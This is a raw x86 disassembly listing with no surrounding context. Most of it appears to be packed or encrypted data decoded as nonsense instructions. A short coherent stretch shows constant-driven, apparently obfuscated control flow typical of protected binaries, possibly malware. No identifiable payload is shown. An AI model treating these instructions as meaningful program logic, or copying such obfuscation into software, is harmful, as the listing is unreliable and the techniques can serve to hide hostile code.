  4081bd:	xor    edx,DWORD PTR [edx-0x540a9afc]
  4081c3:	mov    bl,0x0
  4081c5:	jmp    0x2f009085
  4081ca:	xchg   esp,eax
  4081cb:	sub    esp,eax
  4081cd:	jnp    0x4081e2
  4081cf:	loopne 0x408221
  4081d1:	mov    edx,0xa9bd3736
  4081d6:	push   ebx
  4081d7:	fst    DWORD PTR [edx+eax*4]
  4081da:	sub    cl,BYTE PTR ss:[ecx]
  4081dd:	mov    edi,0x8466ce56
  4081e2:	(bad)
  4081e5:	xchg   ebx,eax
  4081e6:	adc    eax,0xe536da40
  4081eb:	sbb    cl,BYTE PTR [ebx]
  4081ed:	call   0xe016:0x8a85f726
  4081f4:	das    
  4081f5:	dec    esp
  4081f6:	clc    
  4081f7:	add    eax,0x65985aee
  4081fc:	push   ebp
  4081fd:	xchg   ecx,eax
  4081fe:	rcr    BYTE PTR [edx],cl
  408200:	enter  0xd3a7,0x97
  408204:	in     eax,0xed
  408206:	jmp    0x4081c9
  408208:	sar    DWORD PTR [eax+esi*4-0x62bc39fc],1
  40820f:	sub    ch,bl
  408211:	retf   0x18c
  408214:	scas   eax,DWORD PTR es:[edi]
  408215:	jmp    0xcbff:0x88f02617
  40821c:	mov    BYTE PTR [eax+0x4876bd1b],bl
  408222:	cmp    eax,0x66225a08
  408227:	test   eax,0x2c76df63
  40822c:	cli    
  40822d:	fwait
  40822e:	addr16 sub ebp,esi
  408231:	push   cs
  408232:	(bad)  
  408233:	cwde   
  408234:	outs   dx,BYTE PTR ds:[esi]
  408235:	xor    BYTE PTR [eax],ch
  408237:	stos   BYTE PTR es:[edi],al
  408238:	xchg   esi,eax
  408239:	cmp    eax,0x52f6b934
  40823e:	loope  0x4081c3
  408240:	jbe    0x408280
  408242:	add    DWORD PTR [esi],esi
  408244:	pusha  
  408245:	mov    esi,0x9313fa46
  40824a:	add    eax,0xda454c11
  40824f:	lahf   
  408250:	call   0x420702a3
  408255:	test   eax,0xace5cd7c
  40825a:	fcomp  DWORD PTR [edx-0x19751762]
  408260:	ja     0x4082e1
  408262:	rol    ebx,cl
  408264:	inc    esp
  408265:	jnp    0x4082d6
  408267:	nop
  408268:	inc    ebp
  408269:	js     0x4082b2
  40826b:	or     edi,DWORD PTR [edx]
  40826d:	lahf   
  40826e:	js     0x40827e
  408270:	pusha  
  408271:	pop    ecx
  408272:	rcr    cl,0xf7
  408275:	push   ebp
  408276:	(bad)  [ecx+0x20]
  408279:	adc    bh,bh
  40827b:	dec    esi
  40827c:	add    edx,DWORD PTR [edi+0x1530e02e]
  408282:	push   ds
  408283:	cld    
  408284:	cmp    al,0x6e
  408286:	mov    ah,0xa
  408288:	mov    ah,0xd8
  40828a:	or     BYTE PTR [esi],ch
  40828c:	sub    ebp,DWORD PTR [ecx]
  40828e:	xor    BYTE PTR ds:0xa5208dc6,ah
  408294:	hlt    
  408295:	add    cl,BYTE PTR [eax]
  408297:	mov    ch,0x9
  408299:	(bad)  
  40829a:	jmp    0x4082c8
  40829c:	pop    ss
  40829d:	ds dec esi
  40829f:	pop    esi
  4082a0:	pusha  
  4082a1:	leave  
  4082a2:	pushf  
  4082a3:	daa    
  4082a4:	sbb    al,0x3a
  4082a6:	push   0xf404d111
  4082ab:	fs ret 0x5b3a
  4082af:	ins    BYTE PTR es:[edi],dx
  4082b0:	lods   eax,DWORD PTR ds:[esi]
  4082b1:	(bad)  
  4082b2:	in     al,0x88
  4082b4:	imul   edx,DWORD PTR [ebx+0x2f7c1e3],0x8293be85
  4082be:	inc    ecx
  4082bf:	idiv   DWORD PTR [ebp-0x56]
  4082c2:	outs   dx,BYTE PTR ds:[esi]
  4082c3:	pop    edi
  4082c4:	push   0x7e4a515f
  4082c9:	or     DWORD PTR [esi],0x7df977fe
  4082cf:	mov    DWORD PTR [ebx-0x9e139e1],eax
  4082d5:	mov    al,ds:0xbc034449
  4082da:	jge    0x408358
  4082dc:	int    0x42
  4082de:	aas    
  4082df:	sahf   
  4082e0:	std    
  4082e1:	xchg   DWORD PTR [ebx+0x1a],esp
  4082e4:	in     al,0xc7
  4082e6:	lods   al,BYTE PTR ds:[esi]
  4082e7:	mov    ds:0xef885635,al
  4082ec:	jle    0x4082b1
  4082ee:	lds    eax,FWORD PTR [edi+0x52512a61]
  4082f4:	dec    esp
  4082f5:	cmp    ah,dl
  4082f7:	retf   0xe96
  4082fa:	stos   BYTE PTR es:[edi],al
  4082fb:	xor    esi,esi
  4082fd:	push   edx
  4082fe:	ss test dl,bh
  408301:	es mov bh,0x94
  408304:	(bad)  
  408305:	sbb    ecx,DWORD PTR [ebp+0xb]
  408308:	aam    0x2b
  40830a:	aam    0x58
  40830c:	shl    DWORD PTR [ebx],1
  40830e:	inc    esi
  40830f:	adc    dh,BYTE PTR [edi]
  408311:	mov    es,WORD PTR ss:[edi]
  408314:	and    ebx,esi
  408316:	pop    edi
  408317:	pop    eax
  408318:	sbb    eax,0xc015d6d3
  40831d:	adc    esi,DWORD PTR [ecx]
  40831f:	test   DWORD PTR [ebp-0x1ed58d62],ecx
  408325:	pop    edx
  408326:	jge    0x40839d
  408328:	shr    dl,1
  40832a:	pop    esp
  40832b:	jmp    0x13dd3911
  408330:	jge    0x4082d2
  408332:	jecxz  0x408322
  408334:	(bad)  
  408335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408336:	add    ebp,DWORD PTR [esi-0x24]
  408339:	mov    al,ds:0x8a85491d
  40833e:	inc    eax
  40833f:	or     ebp,DWORD PTR [si-0x22]
  408343:	neg    BYTE PTR [ecx+ebx*2-0x3bd83b91]
  40834a:	add    BYTE PTR [eax+0x36],0x7
  40834e:	(bad)  
  40834f:	jb     0x40832e
  408351:	dec    eax
  408352:	jae    0x408303
  408354:	xor    DWORD PTR ds:[esi-0x2c],0x3d
  408359:	and    eax,0x2351749c
  40835e:	outs   dx,DWORD PTR ds:[esi]
  40835f:	adc    al,0x7d
  408361:	leave  
  408362:	xlat   BYTE PTR ds:[ebx]
  408363:	mov    ds:0xf12a1838,eax
  408368:	pop    eax
  408369:	int    0x35
  40836b:	and    al,0xda
  40836d:	push   eax
  40836e:	jp     0x4083e0
  408370:	mov    al,0xd8
  408372:	jge    0x408328
  408374:	xlat   BYTE PTR ds:[ebx]
  408375:	mov    dl,0x88
  408377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408378:	add    eax,ecx
  40837a:	sbb    ebp,edx
  40837c:	jae    0x4082fe
  40837e:	cld    
  40837f:	(bad)  
  408380:	out    0xa0,eax
  408382:	out    dx,al
  408383:	or     ebx,DWORD PTR [ecx+0x57]
  408386:	fwait
  408387:	gs adc ah,dl
  40838a:	sub    edx,ebp
  40838c:	pop    ds
  40838d:	mov    WORD PTR [edi+0x1bf6cdfc],?
  408393:	popa   
  408394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408395:	and    eax,0x45879f25
  40839a:	inc    eax
  40839b:	cmc    
  40839c:	jl     0x408334
  40839e:	xlat   BYTE PTR ds:[ebx]
  40839f:	shl    BYTE PTR [ecx-0x34],0xc1
  4083a3:	mov    al,BYTE PTR [ebp+0x54d0d57d]
  4083a9:	test   ch,0x1a
  4083ac:	cwde   
  4083ad:	add    dl,0x29
  4083b0:	repnz shl edx,0x41
  4083b4:	pop    edx
  4083b5:	inc    eax
  4083b6:	fadd   DWORD PTR [edi]
  4083b8:	mov    edi,0xae392889
  4083bd:	loopne 0x4083c5
  4083bf:	mov    al,ds:0x3cba9fb3
  4083c4:	xchg   edi,eax
  4083c5:	pop    edx
  4083c6:	mov    ebp,0xf3c082ab
  4083cb:	push   edx
  4083cc:	lds    ebp,FWORD PTR [esi+eiz*1]
  4083cf:	pop    eax
  4083d0:	jmp    0x8494:0xd1c95036
  4083d7:	xor    DWORD PTR [bx],ebp
  4083da:	push   es
  4083db:	inc    edx
  4083dc:	enter  0xaa77,0xd9
  4083e0:	enter  0xb040,0x14
  4083e4:	retf   
  4083e5:	and    DWORD PTR [ecx+0x7724cfdb],ecx
  4083eb:	sbb    BYTE PTR [esi+0x36],dl
  4083ee:	fsubr  QWORD PTR [ebp-0x50edde21]
  4083f4:	call   0x95f5:0x9ba0581e
  4083fb:	imul   ecx,DWORD PTR [ecx],0xffffffca
  4083fe:	int    0xa2
  408400:	iret   
  408401:	fisubr WORD PTR [edx+0x17045a5d]
  408407:	sub    esi,ecx
  408409:	cwde   
  40840a:	adc    al,0xc4
  40840c:	jae    0x408425
  40840e:	or     si,WORD PTR [ebx-0x7469f90d]
  408415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408416:	xor    ebp,DWORD PTR [ebp+eax*1+0x19fd7ae4]
  40841d:	ret    0xb655
  408420:	aam    0x79
  408422:	dec    edx
  408423:	in     al,dx
  408424:	in     eax,dx
  408425:	push   0xdc77693f
  40842a:	daa    
  40842b:	std    
  40842c:	test   ah,0xa2
  40842f:	iret   
  408430:	add    eax,0xbc15f353
  408435:	jnp    0x408416
  408437:	imul   ebx,edx,0x8709d762
  40843d:	push   ds
  40843e:	sub    eax,0xefb2c471
  408443:	(bad)  
  408444:	popf   
  408445:	imul   edx,DWORD PTR [ecx-0x1f],0x6a
  408449:	cmp    BYTE PTR [ecx-0x36826933],al
  40844f:	mov    edi,ebp
  408451:	in     eax,dx
  408452:	dec    edi
  408453:	aam    0x5c
  408455:	and    DWORD PTR [ebp-0x6c],eax
  408458:	pop    ebx
  408459:	mov    DWORD PTR [ebx+0x60],esi
  40845c:	fistp  QWORD PTR es:[edi]
  40845f:	fwait
  408460:	pop    eax
  408461:	and    eax,ebx
  408463:	mov    ds:0x689eeac0,al
  408468:	cmc    
  408469:	rcr    BYTE PTR [ecx+0x38c5cfa2],0x1e
  408470:	jb     0x408425
  408472:	sbb    al,0xc4
  408474:	sti    
  408475:	fsubr  st,st(6)
  408477:	xchg   BYTE PTR [esi-0x72d4706],bh
  40847d:	cmp    al,0xab
  40847f:	xlat   BYTE PTR ds:[ebx]
  408480:	sub    bl,BYTE PTR [edx-0x4b029dbd]
  408486:	cs aaa 
  408488:	ret    
  408489:	mov    bl,0x9d
  40848b:	mov    ds:0xbab8786,al
  408490:	sbb    eax,DWORD PTR [esi+0x32]
  408493:	loop   0x4084ef
  408495:	mov    ecx,0xba2d433d
  40849a:	retf   0x5a0c
  40849d:	test   eax,0xfc768c7c
  4084a2:	cs jne 0x4084c3
  4084a5:	xor    eax,0xa75240b8
  4084aa:	sub    eax,DWORD PTR [ecx]
  4084ac:	cld    
  4084ad:	cmp    DWORD PTR [edi],ecx
  4084af:	cmp    edx,DWORD PTR [eax+esi*2]
  4084b2:	cmp    ebp,DWORD PTR es:[edx]
  4084b5:	mov    dh,0xe8
  4084b7:	cmp    eax,0x458bd634
  4084bc:	clc    
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	gs jae 0x4084aa
  408511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408512:	xor    bl,dh
  408514:	jl     0x408592
  408516:	xlat   BYTE PTR ds:[ebx]
  408517:	jns    0x408595
  408519:	jl     0x40858f
  40851b:	dec    ebp
  40851c:	popf   
  40851d:	repz sbb edi,DWORD PTR ds:0xfa3fcc50
  408524:	mov    eax,0x7acdfd9d
  408529:	mov    esp,0xc9ee7067
  40852e:	je     0x408541
  408530:	sub    eax,edi
  408532:	out    0xa4,eax
  408534:	fist   DWORD PTR [ebp-0x24]
  408537:	or     ebp,DWORD PTR ds:0xdad8bc60
  40853d:	dec    ebp
  40853e:	inc    eax
  40853f:	push   edx
  408540:	sbb    bh,0x4
  408543:	fs and al,0x44
  408546:	xor    edi,esi
  408548:	sub    BYTE PTR gs:[ecx-0x66],bl
  40854c:	cmp    dh,BYTE PTR [edx+0x5f86fa30]
  408552:	jo     0x408579
  408554:	adc    BYTE PTR [edx-0x9],dl
  408557:	dec    ebx
  408558:	pop    es
  408559:	arpl   sp,si
  40855b:	inc    ebx
  40855c:	loopne 0x40850f
  40855e:	icebp  
  40855f:	mov    esp,0x60b010bf
  408564:	or     DWORD PTR [ebp+edi*4+0x205e6efc],0x56b8bb84
  40856f:	mov    edi,0x919b4881
  408574:	xor    DWORD PTR [edx],edx
  408576:	push   0x907ea0d5
  40857b:	in     eax,dx
  40857c:	inc    eax
  40857d:	jmp    0x3ce4:0xd2da048c
  408584:	mov    bh,dh
  408586:	fcom   QWORD PTR [esi+ebx*1-0xa]
  40858a:	jne    0x40856f
  40858c:	add    eax,0xa0fd61aa
  408591:	xlat   BYTE PTR ds:[ebx]
  408592:	cmp    al,0xcd
  408594:	(bad)  
  408595:	mov    bh,ch
  408597:	push   eax
  408598:	hlt    
  408599:	bound  esp,QWORD PTR [esi+0x15]
  40859c:	or     ebp,DWORD PTR [ecx+0x7a5f9463]
  4085a2:	outs   dx,BYTE PTR ds:[esi]
  4085a3:	push   cs
  4085a4:	add    dl,BYTE PTR [ebx-0x73]
  4085a7:	repz or ecx,ebx
  4085aa:	sbb    DWORD PTR [esi+0x7],0x3
  4085ae:	adc    BYTE PTR [ebp+0x13791653],ch
  4085b4:	dec    ebp
  4085b5:	test   eax,0x76cdef67
  4085ba:	cdq    
  4085bb:	mov    edx,0x61f7925
  4085c0:	xchg   ebx,eax
  4085c1:	fiadd  WORD PTR [edi-0x1d26aac8]
  4085c7:	adc    BYTE PTR [ebx],dh
  4085c9:	pushf  
  4085ca:	push   ecx
  4085cb:	jno    0x40861f
  4085cd:	jg     0x408595
  4085cf:	dec    esi
  4085d0:	mov    dl,0x84
  4085d2:	sbb    eax,0x5e3e09f8
  4085d7:	adc    BYTE PTR [ecx],0xa6
  4085da:	mov    edx,0x5af7f53d
  4085df:	sar    DWORD PTR [edi],0x8b
  4085e2:	add    eax,0x74846751
  4085e7:	mov    esp,0xc81f7dc9
  4085ec:	cmp    BYTE PTR [ebx-0x1ab5479f],dh
  4085f2:	pop    ss
  4085f3:	xchg   edi,eax
  4085f4:	pop    ebx
  4085f5:	xchg   ecx,eax
  4085f6:	in     eax,dx
  4085f7:	cmp    al,0xd3
  4085f9:	mov    al,ds:0xd1049bec
  4085fe:	sbb    ebx,DWORD PTR [edi-0x6b]
  408601:	mov    cs,edx
  408603:	stos   BYTE PTR es:[edi],al
  408604:	push   esi
  408605:	das    
  408606:	rcl    DWORD PTR [edi],cl
  408608:	lds    ebx,FWORD PTR [ebx+esi*4+0x4e]
  40860c:	and    BYTE PTR ds:0xfb391f13,ch
  408612:	cmp    edx,DWORD PTR [ebx+0x3d]
  408615:	nop
  408616:	scas   al,BYTE PTR es:[edi]
  408617:	xchg   ebx,eax
  408618:	inc    esp
  408619:	ss dec ecx
  40861b:	fdiv   DWORD PTR [edi-0x52316971]
  408621:	lods   eax,DWORD PTR ds:[esi]
  408622:	pop    esp
  408623:	pop    eax
  408624:	mov    WORD PTR [ecx-0x76b9ad52],fs
  40862a:	imul   edi,DWORD PTR [esi-0x6a],0xffffff89
  40862e:	pop    edi
  40862f:	sub    al,0x25
  408631:	jl     0x4085be
  408633:	xchg   edx,eax
  408634:	std    
  408635:	pop    edi
  408636:	loope  0x4085fb
  408638:	mov    BYTE PTR ds:0xe91735bf,bh
  40863e:	aad    0x9f
  408640:	xchg   DWORD PTR [bx+di+0x48],esi
  408644:	dec    edx
  408645:	mov    cl,0xc7
  408647:	outs   dx,BYTE PTR ds:[esi]
  408648:	test   eax,0x1e7c456d
  40864e:	jae    0x408646
  408650:	data16 es js 0x4086b2
  408654:	fwait
  408655:	loop   0x4086ab
  408657:	dec    ebp
  408658:	push   esp
  408659:	repz adc bl,al
  40865c:	mov    al,0xd0
  40865e:	sbb    DWORD PTR [ebx],0x532b57d8
  408664:	icebp  
  408665:	xchg   edi,eax
  408666:	dec    ebp
  408667:	and    ecx,DWORD PTR [ebx]
  408669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40866a:	and    eax,0xa0d85060
  40866f:	aad    0x26
  408671:	repz cli 
  408673:	mov    WORD PTR [ebx-0x7],?
  408676:	fiadd  WORD PTR [ecx+0x2ae92b72]
  40867c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867d:	and    eax,DWORD PTR [edi+0x34]
  408680:	ss adc al,0x7a
  408683:	adc    al,0x8d
  408685:	icebp  
  408686:	bound  ebx,QWORD PTR [edi-0x1e]
  408689:	cwde   
  40868a:	imul   esi,DWORD PTR [edx],0xffffff95
  40868d:	je     0x4086ba
  40868f:	test   al,0xaf
  408691:	pop    edx
  408692:	jne    0x408622
  408694:	and    BYTE PTR [edi-0x80],dl
  408697:	pop    ecx
  408698:	addr16 jne 0x408674
  40869b:	pop    edx
  40869c:	dec    esi
  40869d:	push   esp
  40869e:	jns    0x40862a
  4086a0:	cmp    al,0xf5
  4086a2:	inc    edx
  4086a3:	imul   esi,DWORD PTR [esp-0x42fa5e25],0xee968d34
  4086ae:	out    0x33,al
  4086b0:	(bad)  
  4086b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b2:	int3   
  4086b3:	ja     0x40871c
  4086b5:	pop    ecx
  4086b6:	or     DWORD PTR cs:[edx],ebp
  4086b9:	mov    dl,BYTE PTR cs:[edx-0x720df9c]
  4086c0:	pop    esi
  4086c1:	fnstcw WORD PTR [ebx+edi*4]
  4086c4:	outs   dx,BYTE PTR ds:[esi]
  4086c5:	xchg   DWORD PTR [ebx-0x6d741c11],esi
  4086cb:	rcr    DWORD PTR [ecx+0x52],0xaf
  4086cf:	call   0x13f8:0x80218b77
  4086d6:	mov    BYTE PTR [esi],bh
  4086d8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4086da:	and    bl,ch
  4086dc:	or     al,0x89
  4086de:	call   0xde16:0x3e529581
  4086e5:	sbb    al,0x47
  4086e7:	mov    esp,0xa879e5c1
  4086ec:	aad    0xf6
  4086ee:	mov    ds:0xf75f5517,al
  4086f3:	cdq    
  4086f4:	fbld   TBYTE PTR [esi-0x63]
  4086f7:	scas   al,BYTE PTR es:[edi]
  4086f8:	lock vhaddpd ymm0,ymm4,YMMWORD PTR [eax+edi*1+0x25]
  408700:	jns    0x4086f7
  408702:	es into 
  408704:	xchg   ebp,eax
  408705:	sub    eax,0x6fee9a4c
  40870a:	std    
  40870b:	test   edi,esp
  40870d:	(bad)  
  40870e:	mov    es,WORD PTR [edi*4+0x3ac094eb]
  408715:	gs cdq 
  408717:	mov    esi,DWORD PTR [ebx+0x22]
  40871a:	repz pop eax
  40871c:	cwde   
  40871d:	cs inc esi
  40871f:	mov    BYTE PTR [ecx],bl
  408721:	add    ebp,DWORD PTR [edx+ebx*1-0x65]
  408725:	inc    ebx
  408726:	(bad)  
  40872a:	fldcw  WORD PTR [ebp-0x29]
  40872d:	xor    eax,0x59579fdd
  408732:	sahf   
  408733:	fistp  DWORD PTR cs:0xf1f98338
  40873a:	std    
  40873b:	xchg   BYTE PTR [eax-0x64],dh
  40873e:	push   ebx
  40873f:	and    BYTE PTR [ebp+0x12],al
  408742:	sub    al,0x6
  408744:	sar    BYTE PTR [ebx],0xe5
  408747:	stc    
  408748:	mov    ah,0xc0
  40874a:	dec    esp
  40874b:	outs   dx,BYTE PTR ds:[esi]
  40874c:	add    ecx,DWORD PTR [edi+0x744116f]
  408752:	xchg   ebx,eax
  408753:	sti    
  408754:	stos   BYTE PTR es:[edi],al
  408755:	dec    ebx
  408756:	ret    
  408757:	repz dec ebp
  408759:	lds    edx,FWORD PTR [esi]
  40875b:	adc    esp,DWORD PTR [ecx+0x63]
  40875e:	dec    ebp
  40875f:	retf   0x8c6f
  408762:	test   DWORD PTR [eax-0x104a4a38],ebp
  408768:	out    dx,al
  408769:	sub    dh,BYTE PTR [edi-0x22]
  40876c:	loopne 0x408786
  40876e:	cmp    bl,BYTE PTR [edx]
  408770:	xchg   edi,eax
  408771:	sub    eax,0x94325b06
  408776:	rcr    BYTE PTR [eax],1
  408778:	mov    ecx,0x451862a6
  40877e:	mov    dl,cl
  408780:	rcr    dl,cl
  408782:	test   al,0x9b
  408784:	push   0xf4da2032
  408789:	ficom  DWORD PTR [esi]
  40878b:	sub    al,0x38
  40878d:	inc    ecx
  40878e:	cmp    eax,DWORD PTR [eax+0x6d]
  408791:	mov    ebx,0xa7907d4a
  408796:	xchg   ebp,eax
  408797:	push   esp
  408798:	xchg   ebp,eax
  408799:	jne    0x408746
  40879b:	mov    esi,0xa7992b2b
  4087a0:	and    ch,BYTE PTR [edx-0x2e]
  4087a3:	and    eax,0x259d88a9
  4087a8:	(bad)  
  4087a9:	and    ebp,DWORD PTR [eax+0x25]
  4087ac:	cmp    al,0x27
  4087ae:	mov    ebp,0xfb2c7a4b
  4087b3:	sbb    eax,DWORD PTR [edx+0x52]
  4087b6:	pop    esp
  4087b7:	mov    edx,0x4d664abc
  4087bc:	push   edi
  4087bd:	dec    ebx
  4087be:	ins    BYTE PTR es:[edi],dx
  4087bf:	inc    eax
  4087c0:	xchg   ebx,eax
  4087c1:	inc    esp
  4087c2:	fmul   st(7),st
  4087c4:	stos   DWORD PTR es:[edi],eax
  4087c5:	shl    BYTE PTR [ebx+esi*2+0xf],cl
  4087c9:	jae    0x408784
  4087cb:	xor    eax,0x94d18fd0
  4087d0:	and    al,0x55
  4087d2:	sub    BYTE PTR [edx],bl
  4087d4:	mov    DWORD PTR [ebx],0xd6ee7ce1
  4087da:	mov    BYTE PTR [edx],cl
  4087dc:	xor    al,0x6c
  4087de:	clc    
  4087df:	aaa    
  4087e0:	fist   WORD PTR [ebx+0x7d]
  4087e3:	ret    
  4087e4:	dec    edx
  4087e5:	out    dx,eax
  4087e6:	and    al,0x1e
  4087e8:	shufps xmm2,xmm2,0xb8
  4087ec:	out    dx,eax
  4087ed:	or     edx,DWORD PTR [eax+0x4c]
  4087f0:	push   esi
  4087f1:	or     eax,0x73138ad2
  4087f6:	add    dh,bh
  4087f8:	std    
  4087f9:	jmp    0x94fb2d00
  4087fe:	and    eax,0xce709768
  408803:	cmc    
  408804:	and    BYTE PTR ds:0x6782593b,dh
  40880a:	in     eax,0x94
  40880c:	sub    eax,0x4b9ee937
  408811:	xlat   BYTE PTR ds:[ebx]
  408812:	jo     0x408827
  408814:	(bad)  
  408815:	repz and cl,dl
  408818:	rcr    al,0x9d
  40881b:	xchg   DWORD PTR [ecx-0x3f06ca2c],esi
  408821:	add    BYTE PTR [edx],al
  408823:	add    al,0xa1
  408825:	int    0x54
  408827:	cmp    eax,0x45e8bada
  40882c:	mov    WORD PTR [eax],cs
  40882e:	sub    al,0xaa
  408830:	fsub   QWORD PTR [ebp-0x2686643f]
  408836:	mov    WORD PTR [ebx+0x71aa38da],fs
  40883c:	jmp    FWORD PTR [eax-0x7d]
  40883f:	add    edi,edi
  408841:	and    edi,DWORD PTR [ebp+0x397859b3]
  408847:	adc    al,0xdf
  408849:	bound  eax,QWORD PTR [edi+0x1d]
  40884c:	mov    ecx,0x68d63e5b
  408851:	sub    bh,BYTE PTR [ebp-0x43d5f2ca]
  408857:	fs jle 0x408834
  40885a:	or     edx,esi
  40885c:	in     al,dx
  40885d:	shl    BYTE PTR [ebp+0x2ad14420],cl
  408863:	pop    ebp
  408864:	cmp    BYTE PTR [edx],dh
  408866:	dec    esp
  408867:	rcr    BYTE PTR [ecx],cl
  408869:	fsub   DWORD PTR [ebx]
  40886b:	sub    al,BYTE PTR [eax-0x7d]
  40886e:	ja     0x4088e3
  408870:	cs retf 
  408872:	xor    DWORD PTR es:[eax],0x2650fa8f
  408879:	jmp    0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x91
  4088df:	(bad)  
  4088e0:	psrlw  mm2,QWORD PTR [ebp-0x28838325]
  4088e7:	jns    0x408965
  4088e9:	jl     0x4088d3
  4088eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ec:	inc    edi
  4088ed:	sub    BYTE PTR [esi+0x5c493516],cl
  4088f3:	call   0x2ae55449
  4088f8:	pop    ebp
  4088f9:	mov    esi,0x5a23065c
  4088fe:	sub    BYTE PTR gs:[ebx+eiz*8],bh
  408902:	cmp    eax,0x7a27a52d
  408907:	and    eax,0x76927ae4
  40890c:	ret    0x65a9
  40890f:	dec    ecx
  408910:	icebp  
  408911:	outs   dx,BYTE PTR ds:[esi]
  408912:	les    eax,FWORD PTR [edi]
  408914:	dec    edx
  408915:	sbb    eax,DWORD PTR [edi+0x575a079f]
  40891b:	mov    eax,ds:0xadc1db74
  408920:	xor    ebx,DWORD PTR [esi+0x6d]
  408923:	cmp    ebp,DWORD PTR [edi]
  408925:	mov    ecx,0x3e4076fb
  40892a:	sub    BYTE PTR [eax],bl
  40892c:	dec    esi
  40892d:	(bad)  
  40892e:	mov    cl,0xda
  408930:	call   0x4f496629
  408935:	aas    
  408936:	xchg   edx,eax
  408937:	test   DWORD PTR [eax],ecx
  408939:	jb     0x40892a
  40893b:	adc    edi,0xd9e707f3
  408941:	add    DWORD PTR [esi],ebx
  408943:	sub    eax,DWORD PTR [ebp+0x16608d93]
  408949:	loop   0x4088d1
  40894b:	aam    0x9c
  40894d:	lea    edi,[eax]
  40894f:	xlat   BYTE PTR ds:[ebx]
  408950:	push   0xffffff97
  408952:	adc    DWORD PTR [eax],ecx
  408954:	ss jno 0x40896b
  408957:	int3   
  408958:	cdq    
  408959:	popa   
  40895a:	call   0xe129:0x85f2a86e
  408961:	imul   edx,eax,0x45269f2b
  408967:	loope  0x408900
  408969:	or     BYTE PTR [ebp-0x1fbaf9ca],ch
  40896f:	das    
  408970:	in     eax,dx
  408971:	adc    eax,ebx
  408973:	jmp    0x2ae3e8f5
  408978:	dec    ebp
  408979:	add    DWORD PTR [ecx+0x65],ecx
  40897c:	ds aas 
  40897e:	mov    ch,0x0
  408980:	mov    BYTE PTR [eax],0xd9
  408983:	xchg   BYTE PTR [edx+0xd],ch
  408986:	std    
  408987:	out    0xbc,al
  408989:	inc    ecx
  40898a:	pop    ecx
  40898b:	sub    bl,al
  40898d:	mov    eax,ds:0x6a8101e0
  408992:	int3   
  408993:	jns    0x4089a7
  408995:	je     0x4089d2
  408997:	imul   BYTE PTR [ebp+0x47f1195f]
  40899d:	xchg   DWORD PTR [edi],edx
  40899f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a0:	add    DWORD PTR [esi+esi*4+0x33b19684],edi
  4089a7:	icebp  
  4089a8:	xor    BYTE PTR es:[esi-0x6a],dh
  4089ac:	or     dl,dh
  4089ae:	sub    eax,0x5eb865be
  4089b3:	f2xm1  
  4089b5:	jmp    0x5f85:0x2261c66e
  4089bc:	outs   dx,BYTE PTR ds:[esi]
  4089bd:	mov    ah,0xfe
  4089bf:	hlt    
  4089c0:	pop    ebp
  4089c1:	and    ch,bl
  4089c3:	pop    es
  4089c4:	cmp    al,BYTE PTR [ecx]
  4089c6:	daa    
  4089c7:	fld    QWORD PTR [esi+0x66]
  4089ca:	mov    esp,0x777b82f4
  4089cf:	jno    0x408a49
  4089d1:	mov    eax,ds:0x29c80f87
  4089d6:	xchg   ebp,eax
  4089d7:	out    0x23,al
  4089d9:	push   ebp
  4089da:	das    
  4089db:	cmp    al,0x2b
  4089dd:	push   ebx
  4089de:	xor    al,0xb1
  4089e0:	mov    edx,0x4068e079
  4089e5:	sub    eax,eax
  4089e7:	pop    esi
  4089e8:	xor    eax,0xf5312dbb
  4089ed:	fwait
  4089ee:	sti    
  4089ef:	jb     0x408a35
  4089f1:	inc    eax
